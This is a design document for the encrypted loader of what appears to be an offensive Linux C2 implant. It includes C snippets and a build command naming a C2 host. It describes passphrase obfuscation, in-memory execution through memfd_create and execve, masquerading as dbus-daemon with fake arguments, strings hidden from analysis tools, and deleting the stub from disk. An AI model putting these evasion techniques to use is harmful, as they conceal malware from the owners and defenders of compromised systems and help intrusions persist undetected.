# Stub Packer

The stub packer wraps the compiled agent binary in a minimal encrypted loader. The final binary contains only the stub code (~3KB) plus the encrypted agent blob. Running `strings` or static analysis on the packed binary reveals nothing from the agent — no Ax\*/Beacon\* API names, no URIs, no headers, no keys.

---

## How It Works

```
┌─────────────────────────────────────────────────────────┐
│                    Packed Binary                         │
│                                                         │
│  stub.c code (~3KB)                                     │
│  ┌───────────────────────────────────────────────────┐  │
│  │ stub_payload.h (embedded at compile time)          │  │
│  │   - salt (16 bytes random)                         │  │
│  │   - passphrase fragments (4×8 bytes, shuffled+XOR) │  │
│  │   - encrypted agent blob (XOR with derived key)    │  │
│  └───────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘

At runtime:
  1. Reconstruct passphrase from shuffled fragments
  2. Derive XOR key via KDF (FNV-1a 64-bit + xorshift64)
  3. Decrypt agent into heap buffer
  4. memfd_create("") → anonymous fd
  5. write(fd, decrypted_agent)
  6. Zero decrypted buffer + free
  7. prctl(PR_SET_NAME, "dbus-daemon")
  8. execve("/proc/self/fd/N", fake_argv) → agent runs from memory
```

After `execve`, the stub process image is replaced by the agent. The decrypted agent never exists on disk or in a named file — only in an anonymous memory-backed fd.

---

## Build Flow

```bash
# 1. Compile the agent (automatic — Makefile handles everything)
make NAX_TCP_MODE=https NAX_C2_HOST=192.168.1.1 NAX_C2_PORT=443 ...

# The Makefile automatically:
#   a) Compiles the agent ELF
#   b) Runs gen_stub_payload.sh → encrypts agent → generates stub_payload.h
#   c) Compiles stub.c with embedded payload → overwrites the target binary
#   d) Strips the final binary
```

No manual steps required. The stub wrapping is automatic for all ELF builds (`NAX_FORMAT=elf`). It is disabled for shared library builds (`NAX_FORMAT=so`).

---

## Encryption Scheme

### Key Derivation

The encryption does not use a static XOR key. Instead, it derives the key at runtime from a passphrase and salt:

```
Passphrase (32 bytes random, generated at build time)
    +
Salt (16 bytes random, generated at build time)
    ↓
FNV-1a 64-bit hash (passphrase bytes, then salt bytes)
    ↓
xorshift64 PRNG expansion → 32 bytes of key material
    ↓
XOR key (32 bytes)
```

The KDF is implemented identically in Python (`gen_stub_payload.sh`) and C (`stub.c`), producing the same key from the same inputs.

### Passphrase Protection

The passphrase is not stored directly in the binary. It is:

1. **XOR-obfuscated** — each byte XORed with `(0x37 + i * 13) & 0xFF`
2. **Fragmented** — split into 4 chunks of 8 bytes
3. **Shuffled** — fragments stored in order `[2, 0, 3, 1]`, not `[0, 1, 2, 3]`

At runtime, `reconstruct_pass()` reassembles the original order and reverses the XOR:

```c
memcpy(pass +  0, stub_pass_frag1, 8);   /* original[0] */
memcpy(pass +  8, stub_pass_frag3, 8);   /* original[1] */
memcpy(pass + 16, stub_pass_frag0, 8);   /* original[2] */
memcpy(pass + 24, stub_pass_frag2, 8);   /* original[3] */

for (int i = 0; i < 32; i++)
    pass[i] ^= (0x37 + i * 13) & 0xFF;
```

This means a static analysis tool cannot find the passphrase by searching for a contiguous 32-byte constant — it is scattered, reordered, and obfuscated.

---

## Process Camouflage

After decryption and before `execve`, the stub disguises itself:

### Process name

```c
prctl(PR_SET_NAME, "dbus-daemon");
```

### Fake argv

```c
char *fake_argv[] = {
    "/usr/bin/dbus-daemon",
    "--system",
    "--address=systemd:",
    "--nofork",
    "--nopidfile",
    "--systemd-activation",
    "--syslog-only",
    NULL
};
execve(fd_path, fake_argv, environ);
```

In `ps` output, the agent appears as:

```
/usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
```

All strings (`dbus-daemon`, `--system`, etc.) are built char-by-char with volatile writes — they do not appear in `strings` output of the binary.

### Session detach

```c
setsid();
```

The agent detaches from the controlling terminal, preventing it from receiving signals when the terminal closes.

---

## Self-Delete Integration

Before `execve`, the stub saves its own path:

```c
setenv("NAX_STUB_PATH", realpath(argv[0]), 1);
```

When the agent exits (or OPSEC detects a hostile environment), `nax_opsec_cleanup()` reads this variable and deletes the stub binary from disk:

```c
// In opsec.c
const char *stub_path = getenv("NAX_STUB_PATH");
if (stub_path && *stub_path)
    unlink(stub_path);
```

After the agent finishes, `unsetenv("NAX_STUB_PATH")` removes the variable from memory.

---

## Memory Execution Fallback

The stub tries three methods to create an anonymous executable fd:

| Priority | Method | Description |
|---|---|---|
| 1 | `memfd_create("")` | Preferred — fully anonymous, no filesystem entry |
| 2 | `O_TMPFILE` on `/dev/shm` | RAM-backed tmpfs, auto-deleted on close |
| 3 | `O_TMPFILE` on `/tmp` | Disk-backed, auto-deleted on close |

All paths (`/dev/shm`, `/tmp`, `/proc/self/fd/N`) are built with volatile char writes — not visible in `strings`.

---

## Memory Hygiene

The stub zeros all sensitive data before `execve`:

| Data | Zeroed when |
|---|---|
| Reconstructed passphrase | Immediately after KDF |
| Derived XOR key | Immediately after decryption |
| Decrypted agent buffer | After `write()` to memfd, before `free()` |

After `execve`, the stub's address space is replaced by the agent. No residual decryption key or plaintext agent bytes remain in memory.

---

## When the Stub Is Disabled

| Build mode | Stub |
|---|---|
| `NAX_FORMAT=elf` | ✅ Automatic (default) |
| `NAX_FORMAT=so` | ❌ Disabled — `.so` is loaded by `dlopen`, not executed |
| `NAX_DEBUG=1` | ✅ Still applied (debug + packed) |

---

## What `strings` Shows

**Unpacked agent:**
```
BeaconPrintf
BeaconDataParse
AxOpenFile
AxMalloc
Ax*
...
```

**Packed agent (stub):**
```
free
execve
malloc
write
close
syscall
libc.so.6
GLIBC_2.4
```

Only standard libc symbols from the dynamic linker — nothing from the agent.

---

## Files

| File | Description |
|------|-------------|
| `nax_linux/src/stub/stub.c` | Stub loader source |
| `nax_linux/src/stub/gen_stub_payload.sh` | Encryption + header generation script |
| `nax_linux/src/stub/stub_payload.h` | Auto-generated encrypted payload (gitignored) |
